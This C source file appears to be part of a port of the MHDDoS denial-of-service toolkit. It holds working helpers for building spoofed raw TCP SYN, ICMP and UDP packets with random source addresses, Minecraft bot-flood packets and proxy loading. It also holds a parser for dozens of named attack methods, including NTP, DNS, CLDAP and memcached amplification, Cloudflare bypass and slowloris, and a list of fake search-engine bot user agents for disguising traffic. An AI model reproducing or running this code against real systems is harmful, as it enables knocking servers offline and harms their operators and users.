#include "mhddos.h"

atomic_long REQUESTS_SENT = 0;
atomic_long BYTES_SEND = 0;
char g_local_ip[64] = {0};

void do_exit(const char *msg) {
    if (msg)
        fprintf(stderr, BCOLORS_FAIL "%s" BCOLORS_RESET "\n", msg);
    exit(1);
}

void get_local_ip(char *buf, int buflen) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) { strncpy(buf, "127.0.0.1", buflen); return; }
    struct sockaddr_in serv;
    memset(&serv, 0, sizeof(serv));
    serv.sin_family = AF_INET;
    serv.sin_port = htons(80);
    inet_pton(AF_INET, "8.8.8.8", &serv.sin_addr);
    connect(s, (struct sockaddr*)&serv, sizeof(serv));
    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    getsockname(s, (struct sockaddr*)&name, &namelen);
    inet_ntop(AF_INET, &name.sin_addr, buf, buflen);
    close(s);
}

int resolve_host(const char *hostname, char *ip_buf, int ip_buf_len) {
    struct in_addr addr;
    if (inet_pton(AF_INET, hostname, &addr) == 1) {
        strncpy(ip_buf, hostname, ip_buf_len);
        return 1;
    }
    uint8_t qbuf[512];
    memset(qbuf, 0, sizeof(qbuf));
    uint16_t txid = rand() & 0xFFFF;
    qbuf[0] = (txid >> 8) & 0xFF;
    qbuf[1] = txid & 0xFF;
    qbuf[2] = 0x01; qbuf[3] = 0x00;
    qbuf[4] = 0x00; qbuf[5] = 0x01;
    qbuf[6] = 0x00; qbuf[7] = 0x00;
    qbuf[8] = 0x00; qbuf[9] = 0x00;
    qbuf[10] = 0x00; qbuf[11] = 0x00;
    int pos = 12;
    const char *p = hostname;
    while (*p) {
        const char *dot = strchr(p, '.');
        int len = dot ? (int)(dot - p) : (int)strlen(p);
        qbuf[pos++] = len;
        memcpy(qbuf + pos, p, len);
        pos += len;
        if (dot) p = dot + 1;
        else break;
    }
    qbuf[pos++] = 0;
    qbuf[pos++] = 0x00; qbuf[pos++] = 0x01;
    qbuf[pos++] = 0x00; qbuf[pos++] = 0x01;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return 0;
    struct timeval tv = {3, 0};
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    struct sockaddr_in dns;
    memset(&dns, 0, sizeof(dns));
    dns.sin_family = AF_INET;
    dns.sin_port = htons(53);
    inet_pton(AF_INET, "8.8.8.8", &dns.sin_addr);
    sendto(s, qbuf, pos, 0, (struct sockaddr*)&dns, sizeof(dns));
    uint8_t rbuf[512];
    int rlen = recv(s, rbuf, sizeof(rbuf), 0);
    close(s);
    if (rlen < 12) return 0;
    int ancount = (rbuf[6] << 8) | rbuf[7];
    if (ancount == 0) return 0;
    int rpos = 12;
    while (rpos < rlen && rbuf[rpos] != 0) {
        rpos += rbuf[rpos] + 1;
    }
    rpos += 5;
    for (int i = 0; i < ancount && rpos < rlen; i++) {
        if ((rbuf[rpos] & 0xC0) == 0xC0) rpos += 2;
        else { while (rpos < rlen && rbuf[rpos] != 0) rpos += rbuf[rpos] + 1; rpos++; }
        if (rpos + 10 > rlen) return 0;
        uint16_t rtype = (rbuf[rpos] << 8) | rbuf[rpos+1];
        uint16_t rdlen = (rbuf[rpos+8] << 8) | rbuf[rpos+9];
        rpos += 10;
        if (rtype == 1 && rdlen == 4) {
            snprintf(ip_buf, ip_buf_len, "%d.%d.%d.%d",
                     rbuf[rpos], rbuf[rpos+1], rbuf[rpos+2], rbuf[rpos+3]);
            return 1;
        }
        rpos += rdlen;
    }
    return 0;
}

void rand_bytes(uint8_t *buf, int len) {
    FILE *f = fopen("/dev/urandom", "rb");
    if (f) { fread(buf, 1, len, f); fclose(f); }
    else { for (int i = 0; i < len; i++) buf[i] = rand() & 0xFF; }
}

void rand_str(char *buf, int len) {
    static const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (int i = 0; i < len; i++) buf[i] = charset[rand() % (sizeof(charset) - 1)];
    buf[len] = '\0';
}

void rand_ipv4(char *buf, int buflen) {
    snprintf(buf, buflen, "%d.%d.%d.%d", rand()%256, rand()%256, rand()%256, rand()%256);
}

int rand_int(int min, int max) {
    if (max <= min) return min;
    return min + rand() % (max - min + 1);
}

char *rand_choice_str(char **arr, int count) {
    if (!arr || count <= 0) return "";
    return arr[rand() % count];
}

int tools_send(int sock, const uint8_t *packet, int len) {
    int sent = send(sock, packet, len, MSG_NOSIGNAL);
    if (sent <= 0) return 0;
    atomic_fetch_add(&BYTES_SEND, sent);
    atomic_fetch_add(&REQUESTS_SENT, 1);
    return 1;
}

int tools_sendto(int sock, const uint8_t *packet, int len, struct sockaddr_in *addr) {
    int sent = sendto(sock, packet, len, 0, (struct sockaddr*)addr, sizeof(*addr));
    if (sent <= 0) return 0;
    atomic_fetch_add(&BYTES_SEND, sent);
    atomic_fetch_add(&REQUESTS_SENT, 1);
    return 1;
}

void safe_close(int sock) {
    if (sock >= 0) close(sock);
}

void humanbytes(long i, char *buf, int buflen) {
    const char *suffixes[] = {"B", "kB", "MB", "GB", "TB", "PB"};
    if (i <= 0) { snprintf(buf, buflen, "-- B"); return; }
    int idx = 0;
    double val = (double)i;
    while (val >= 1000.0 && idx < 5) { val /= 1000.0; idx++; }
    snprintf(buf, buflen, "%.2f %s", val, suffixes[idx]);
}

void humanformat(long num, char *buf, int buflen) {
    const char *suffixes[] = {"", "k", "m", "g", "t", "p"};
    if (num <= 999) { snprintf(buf, buflen, "%ld", num); return; }
    int idx = 0;
    double val = (double)num;
    while (val >= 1000.0 && idx < 5) { val /= 1000.0; idx++; }
    snprintf(buf, buflen, "%.2f%s", val, suffixes[idx]);
}

uint16_t ip_checksum(void *vdata, size_t length) {
    char *data = (char *)vdata;
    uint32_t acc = 0;
    for (size_t i = 0; i + 1 < length; i += 2) {
        uint16_t word;
        memcpy(&word, data + i, 2);
        acc += ntohs(word);
    }
    if (length & 1) acc += (uint16_t)(((unsigned char*)data)[length-1]) << 8;
    while (acc >> 16) acc = (acc & 0xFFFF) + (acc >> 16);
    return htons(~acc);
}

void build_ip_header(struct iphdr *iph, const char *src, const char *dst, int protocol, int total_len) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(total_len);
    iph->id = htons(rand() & 0xFFFF);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = protocol;
    iph->check = 0;
    inet_pton(AF_INET, src, &iph->saddr);
    inet_pton(AF_INET, dst, &iph->daddr);
    iph->check = ip_checksum(iph, sizeof(struct iphdr));
}

struct pseudo_header {
    uint32_t src;
    uint32_t dst;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t tcp_length;
};

void build_tcp_syn(uint8_t *packet, int *plen, const char *src_ip, const char *dst_ip, int src_port, int dst_port) {
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    int total_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    memset(packet, 0, total_len);
    build_ip_header(iph, src_ip, dst_ip, IPPROTO_TCP, total_len);
    tcph->source = htons(src_port);
    tcph->dest = htons(dst_port);
    tcph->seq = htonl(rand());
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(65535);
    tcph->check = 0;
    struct pseudo_header psh;
    inet_pton(AF_INET, src_ip, &psh.src);
    inet_pton(AF_INET, dst_ip, &psh.dst);
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));
    uint8_t pseudogram[sizeof(struct pseudo_header) + sizeof(struct tcphdr)];
    memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
    tcph->check = ip_checksum(pseudogram, sizeof(pseudogram));
    iph->check = 0;
    iph->check = ip_checksum(iph, sizeof(struct iphdr));
    *plen = total_len;
}

void build_icmp_echo(uint8_t *packet, int *plen, const char *src_ip, const char *dst_ip, int data_len) {
    int icmp_len = sizeof(struct icmphdr) + data_len;
    int total_len = sizeof(struct iphdr) + icmp_len;
    memset(packet, 0, total_len);
    struct iphdr *iph = (struct iphdr *)packet;
    build_ip_header(iph, src_ip, dst_ip, IPPROTO_ICMP, total_len);
    struct icmphdr *icmph = (struct icmphdr *)(packet + sizeof(struct iphdr));
    icmph->type = ICMP_ECHO;
    icmph->code = 0;
    icmph->un.echo.id = htons(rand() & 0xFFFF);
    icmph->un.echo.sequence = htons(1);
    memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), 'A', data_len);
    icmph->checksum = 0;
    icmph->checksum = ip_checksum(icmph, icmp_len);
    iph->check = 0;
    iph->check = ip_checksum(iph, sizeof(struct iphdr));
    *plen = total_len;
}

void build_udp_raw(uint8_t *packet, int *plen, const char *src_ip, const char *dst_ip,
                   int src_port, int dst_port, const uint8_t *data, int data_len) {
    int udp_len = sizeof(struct udphdr) + data_len;
    int total_len = sizeof(struct iphdr) + udp_len;
    memset(packet, 0, total_len);
    struct iphdr *iph = (struct iphdr *)packet;
    build_ip_header(iph, src_ip, dst_ip, IPPROTO_UDP, total_len);
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
    udph->source = htons(src_port);
    udph->dest = htons(dst_port);
    udph->len = htons(udp_len);
    udph->check = 0;
    memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), data, data_len);
    *plen = total_len;
}

int mc_varint(int d, uint8_t *out) {
    int pos = 0;
    while (1) {
        uint8_t b = d & 0x7F;
        d >>= 7;
        out[pos++] = b | (d > 0 ? 0x80 : 0);
        if (d == 0) break;
    }
    return pos;
}

int mc_data(const uint8_t *payload, int plen, uint8_t *out) {
    uint8_t vbuf[8];
    int vlen = mc_varint(plen, vbuf);
    memcpy(out, vbuf, vlen);
    memcpy(out + vlen, payload, plen);
    return vlen + plen;
}

int mc_short(int integer, uint8_t *out) {
    out[0] = (integer >> 8) & 0xFF;
    out[1] = integer & 0xFF;
    return 2;
}

int mc_long(int64_t integer, uint8_t *out) {
    for (int i = 7; i >= 0; i--)
        out[7 - i] = (integer >> (i * 8)) & 0xFF;
    return 8;
}

int mc_handshake(const char *host, int port, int version, int state, uint8_t *out) {
    uint8_t inner[1024];
    int pos = 0;
    pos += mc_varint(0x00, inner + pos);
    pos += mc_varint(version, inner + pos);
    int hlen = strlen(host);
    uint8_t hdata[512];
    int hdlen = mc_data((const uint8_t*)host, hlen, hdata);
    memcpy(inner + pos, hdata, hdlen); pos += hdlen;
    pos += mc_short(port, inner + pos);
    pos += mc_varint(state, inner + pos);
    return mc_data(inner, pos, out);
}

int mc_handshake_forwarded(const char *host, int port, int version, int state,
                           const char *ip, const char *uuid_str, uint8_t *out) {
    uint8_t inner[2048];
    int pos = 0;
    pos += mc_varint(0x00, inner + pos);
    pos += mc_varint(version, inner + pos);
    uint8_t hostdata[1024];
    int hdpos = 0;
    memcpy(hostdata + hdpos, host, strlen(host)); hdpos += strlen(host);
    hostdata[hdpos++] = 0x00;
    memcpy(hostdata + hdpos, ip, strlen(ip)); hdpos += strlen(ip);
    hostdata[hdpos++] = 0x00;
    memcpy(hostdata + hdpos, uuid_str, strlen(uuid_str)); hdpos += strlen(uuid_str);
    uint8_t wrapped[1024];
    int wlen = mc_data(hostdata, hdpos, wrapped);
    memcpy(inner + pos, wrapped, wlen); pos += wlen;
    pos += mc_short(port, inner + pos);
    pos += mc_varint(state, inner + pos);
    return mc_data(inner, pos, out);
}

int mc_login(int protocol, const char *username, uint8_t *out) {
    uint8_t inner[512];
    int pos = 0;
    int pid = (protocol >= 391) ? 0x00 : (protocol >= 385) ? 0x01 : 0x00;
    pos += mc_varint(pid, inner + pos);
    int ulen = strlen(username);
    uint8_t udata[256];
    int udlen = mc_data((const uint8_t*)username, ulen, udata);
    memcpy(inner + pos, udata, udlen); pos += udlen;
    return mc_data(inner, pos, out);
}

int mc_keepalive(int protocol, int64_t num_id, uint8_t *out) {
    uint8_t inner[64];
    int pos = 0;
    int pid = (protocol >= 755) ? 0x0F : (protocol >= 712) ? 0x10 :
              (protocol >= 471) ? 0x0F : (protocol >= 464) ? 0x10 :
              (protocol >= 389) ? 0x0E : (protocol >= 386) ? 0x0C :
              (protocol >= 345) ? 0x0B : (protocol >= 343) ? 0x0A :
              (protocol >= 336) ? 0x0B : (protocol >= 318) ? 0x0C :
              (protocol >= 107) ? 0x0B : 0x00;
    pos += mc_varint(pid, inner + pos);
    if (protocol >= 339)
        pos += mc_long(num_id, inner + pos);
    else
        pos += mc_varint((int)num_id, inner + pos);
    return mc_data(inner, pos, out);
}

int mc_chat(int protocol, const char *message, uint8_t *out) {
    uint8_t inner[1024];
    int pos = 0;
    int pid = (protocol >= 755) ? 0x03 : (protocol >= 464) ? 0x03 :
              (protocol >= 389) ? 0x02 : (protocol >= 343) ? 0x01 :
              (protocol >= 336) ? 0x02 : (protocol >= 318) ? 0x03 :
              (protocol >= 107) ? 0x02 : 0x01;
    pos += mc_varint(pid, inner + pos);
    int mlen = strlen(message);
    uint8_t mdata[1024];
    int mdlen = mc_data((const uint8_t*)message, mlen, mdata);
    memcpy(inner + pos, mdata, mdlen); pos += mdlen;
    return mc_data(inner, pos, out);
}

void parse_url(const char *raw, url_t *u) {
    memset(u, 0, sizeof(url_t));
    const char *p = raw;
    if (strncmp(p, "https://", 8) == 0) {
        strcpy(u->scheme, "https");
        p += 8;
    } else if (strncmp(p, "http://", 7) == 0) {
        strcpy(u->scheme, "http");
        p += 7;
    } else {
        strcpy(u->scheme, "http");
    }
    const char *slash = strchr(p, '/');
    const char *colon = strchr(p, ':');
    if (colon && (!slash || colon < slash)) {
        strncpy(u->host, p, colon - p);
        u->port = atoi(colon + 1);
    } else {
        if (slash) strncpy(u->host, p, slash - p);
        else strcpy(u->host, p);
        u->port = (strcmp(u->scheme, "https") == 0) ? 443 : 80;
    }
    strcpy(u->raw_host, u->host);
    if (slash) strcpy(u->path, slash);
    else strcpy(u->path, "/");
    strcpy(u->raw_path_qs, u->path);
    snprintf(u->authority, sizeof(u->authority), "%s:%d", u->host, u->port);
    strcpy(u->raw_authority, u->authority);
    snprintf(u->human_repr, sizeof(u->human_repr), "%s://%s%s", u->scheme, u->authority, u->path);
}

method_t parse_method(const char *s) {
    if (!s) return METHOD_UNKNOWN;
    if (strcasecmp(s, "TCP") == 0) return METHOD_TCP;
    if (strcasecmp(s, "UDP") == 0) return METHOD_UDP;
    if (strcasecmp(s, "SYN") == 0) return METHOD_SYN;
    if (strcasecmp(s, "ICMP") == 0) return METHOD_ICMP;
    if (strcasecmp(s, "VSE") == 0) return METHOD_VSE;
    if (strcasecmp(s, "TS3") == 0) return METHOD_TS3;
    if (strcasecmp(s, "MCPE") == 0) return METHOD_MCPE;
    if (strcasecmp(s, "FIVEM") == 0) return METHOD_FIVEM;
    if (strcasecmp(s, "FIVEM-TOKEN") == 0) return METHOD_FIVEM_TOKEN;
    if (strcasecmp(s, "OVH-UDP") == 0) return METHOD_OVH_UDP;
    if (strcasecmp(s, "MINECRAFT") == 0) return METHOD_MINECRAFT;
    if (strcasecmp(s, "CPS") == 0) return METHOD_CPS;
    if (strcasecmp(s, "CONNECTION") == 0) return METHOD_CONNECTION;
    if (strcasecmp(s, "MCBOT") == 0) return METHOD_MCBOT;
    if (strcasecmp(s, "MEM") == 0) return METHOD_MEM;
    if (strcasecmp(s, "NTP") == 0) return METHOD_NTP;
    if (strcasecmp(s, "DNS") == 0) return METHOD_DNS_AMP;
    if (strcasecmp(s, "ARD") == 0) return METHOD_ARD;
    if (strcasecmp(s, "CLDAP") == 0) return METHOD_CLDAP;
    if (strcasecmp(s, "CHAR") == 0) return METHOD_CHAR;
    if (strcasecmp(s, "RDP") == 0) return METHOD_RDP;
    if (strcasecmp(s, "GET") == 0) return METHOD_GET;
    if (strcasecmp(s, "POST") == 0) return METHOD_POST;
    if (strcasecmp(s, "CFB") == 0) return METHOD_CFB;
    if (strcasecmp(s, "BYPASS") == 0) return METHOD_BYPASS;
    if (strcasecmp(s, "OVH") == 0) return METHOD_OVH;
    if (strcasecmp(s, "STRESS") == 0) return METHOD_STRESS;
    if (strcasecmp(s, "DYN") == 0) return METHOD_DYN;
    if (strcasecmp(s, "SLOW") == 0) return METHOD_SLOW;
    if (strcasecmp(s, "HEAD") == 0) return METHOD_HEAD;
    if (strcasecmp(s, "NULL") == 0) return METHOD_NULL;
    if (strcasecmp(s, "COOKIE") == 0) return METHOD_COOKIE;
    if (strcasecmp(s, "PPS") == 0) return METHOD_PPS;
    if (strcasecmp(s, "EVEN") == 0) return METHOD_EVEN;
    if (strcasecmp(s, "GSB") == 0) return METHOD_GSB;
    if (strcasecmp(s, "DGB") == 0) return METHOD_DGB;
    if (strcasecmp(s, "AVB") == 0) return METHOD_AVB;
    if (strcasecmp(s, "CFBUAM") == 0) return METHOD_CFBUAM;
    if (strcasecmp(s, "APACHE") == 0) return METHOD_APACHE;
    if (strcasecmp(s, "XMLRPC") == 0) return METHOD_XMLRPC;
    if (strcasecmp(s, "BOT") == 0) return METHOD_BOT;
    if (strcasecmp(s, "BOMB") == 0) return METHOD_BOMB;
    if (strcasecmp(s, "DOWNLOADER") == 0) return METHOD_DOWNLOADER;
    if (strcasecmp(s, "KILLER") == 0) return METHOD_KILLER;
    if (strcasecmp(s, "TOR") == 0) return METHOD_TOR;
    if (strcasecmp(s, "RHEX") == 0) return METHOD_RHEX;
    if (strcasecmp(s, "STOMP") == 0) return METHOD_STOMP;
    return METHOD_UNKNOWN;
}

int is_layer4(method_t m) {
    return (m >= METHOD_TCP && m <= METHOD_RDP);
}

int is_layer7(method_t m) {
    return (m >= METHOD_GET && m <= METHOD_STOMP);
}

int is_amp(method_t m) {
    return (m == METHOD_MEM || m == METHOD_NTP || m == METHOD_DNS_AMP ||
            m == METHOD_ARD || m == METHOD_CLDAP || m == METHOD_CHAR || m == METHOD_RDP);
}

int check_raw_socket(void) {
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) return 0;
    close(s);
    return 1;
}

const char *get_method_type_str(method_t m) {
    switch (m) {
        case METHOD_POST: case METHOD_XMLRPC: case METHOD_STRESS:
            return "POST";
        case METHOD_GSB: case METHOD_HEAD:
            return "HEAD";
        default:
            return "GET";
    }
}

int load_lines(const char *path, char ***lines, int max_lines) {
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    *lines = malloc(sizeof(char*) * max_lines);
    int count = 0;
    char buf[MAX_LINE];
    while (fgets(buf, sizeof(buf), f) && count < max_lines) {
        buf[strcspn(buf, "\r\n")] = 0;
        if (strlen(buf) > 0) {
            (*lines)[count] = strdup(buf);
            count++;
        }
    }
    fclose(f);
    return count;
}

int load_proxies(const char *path, proxy_t *proxies, int max_proxies, proxy_type_t type) {
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    int count = 0;
    char buf[MAX_LINE];
    while (fgets(buf, sizeof(buf), f) && count < max_proxies) {
        buf[strcspn(buf, "\r\n")] = 0;
        if (strlen(buf) == 0) continue;
        char *colon = strchr(buf, ':');
        if (!colon) continue;
        *colon = 0;
        strncpy(proxies[count].host, buf, sizeof(proxies[count].host) - 1);
        proxies[count].port = atoi(colon + 1);
        proxies[count].type = type;
        count++;
    }
    fclose(f);
    return count;
}

static const char *search_engine_agents[] = {
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Twitterbot/1.0",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "SemrushBot/7~bl (+http://www.semrush.com/bot.html)"
};
#define SEARCH_AGENT_COUNT 10

const char *rand_search_agent(void) {
    return search_engine_agents[rand() % SEARCH_AGENT_COUNT];
}
